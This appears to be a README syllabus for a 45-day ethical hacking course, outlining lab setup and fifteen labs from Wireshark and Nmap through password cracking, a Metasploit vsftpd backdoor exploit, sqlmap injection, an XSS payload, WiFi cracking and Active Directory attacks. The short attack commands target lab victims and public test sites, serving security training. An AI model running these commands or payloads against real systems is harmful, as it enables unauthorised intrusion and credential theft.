
# 🔐 Ethical Hacking 45-Day Master Program (Zero to Advanced)

Author: Vishwanath Gowda  
Level: Beginner → Advanced  
Duration: 45 Days  
Mode: Hands-on + Labs + Real Outputs  

---

## 📌 Course Outcome
After completing this program, you will be able to:
- Perform real-world penetration testing
- Identify, exploit, and report vulnerabilities
- Work with Web, Network, Cloud, AD, and DevSecOps security
- Prepare for CEH / OSCP / PNPT / Bug Bounty

---

## 🧰 Lab Setup (MANDATORY)
### Hardware
- Laptop (8GB RAM minimum, 16GB recommended)
- 50GB free disk

### Virtualization
- VirtualBox / VMware

### OS
- Kali Linux (Attacker)
- Metasploitable2 (Victim)
- Windows 10 (Victim)
- DVWA / Juice Shop

---

## 🧪 PHASE-WISE LABS, TOOLS & OUTPUTS

## 🔰 Phase 0 – Foundations (Day 1–5)

### Lab 1: Network Understanding
**Tools:** Wireshark  
**Task:** Capture packets while browsing  
**Output:** Identify TCP handshake, DNS query

---

## 🛠 Phase 1 – Recon & Scanning (Day 6–10)

### Lab 2: OSINT Recon
**Tools:** Google Dorks, theHarvester  
**Command:**
theHarvester -d example.com -b google

**Output:** Emails, subdomains list

---

### Lab 3: Nmap Scanning
**Tools:** Nmap  
**Command:**
nmap -sC -sV -A 192.168.1.10

**Output:** Open ports, services, OS details

---

## 💥 Phase 2 – System Hacking (Day 11–17)

### Lab 4: Password Cracking
**Tools:** John the Ripper  
**Command:**
john hashes.txt --wordlist=rockyou.txt

**Output:** Cracked passwords

---

### Lab 5: Metasploit Exploitation
**Tools:** Metasploit  
**Commands:**
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.10
run

**Output:** Meterpreter shell

---

### Lab 6: Privilege Escalation (Linux)
**Tools:** LinPEAS  
**Command:**
./linpeas.sh

**Output:** Root access indicators

---

## 🌐 Phase 3 – Web Application Hacking (Day 18–27)

### Lab 7: SQL Injection
**Tools:** Burp Suite, SQLmap  
**Command:**
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs

**Output:** Database names

---

### Lab 8: XSS Attack
**Payload:**
<script>alert('XSS')</script>

**Output:** JavaScript execution

---

### Lab 9: File Upload Attack
**Tools:** Burp Suite  
**Output:** Web shell access

---

## 📡 Phase 4 – Network, AD & Cloud (Day 28–35)

### Lab 10: Wireless Attack
**Tools:** Aircrack-ng  
**Command:**
aircrack-ng capture.cap

**Output:** WiFi key

---

### Lab 11: Active Directory Attack
**Tools:** BloodHound, Mimikatz  
**Output:** Domain Admin access path

---

### Lab 12: AWS Cloud Security
**Tools:** ScoutSuite  
**Command:**
scout aws

**Output:** Misconfigured IAM policies

---

## 🧪 Phase 5 – Advanced & Career (Day 36–45)

### Lab 13: Malware Analysis
**Tools:** VirusTotal, strings  
**Output:** IOC indicators

---

### Lab 14: Phishing Simulation
**Tools:** Gophish  
**Output:** Click-rate report

---

### Lab 15: Final Pentest Project
**Deliverables:**
- Recon report
- Exploit proof
- Risk rating
- Mitigation steps

---

## 📄 Sample Output Screenshot (Expected)
- Nmap scan result
- SQLmap DB dump
- Meterpreter session
- Burp HTTP request

---

## 🧾 Reporting Template
- Executive Summary
- Scope
- Findings
- CVSS Score
- Proof of Concept
- Recommendation

---

## 🎓 Certification Mapping
- CEH: Phases 0–3
- OSCP: Phases 2–4
- Bug Bounty: Phase 3
- Cloud Security: Phase 4

---

## 🚀 Next Steps
- Hack The Box
- TryHackMe
- Bugcrowd
- HackerOne

---

🔥 This README is designed to beat typical institute syllabi with real skills.
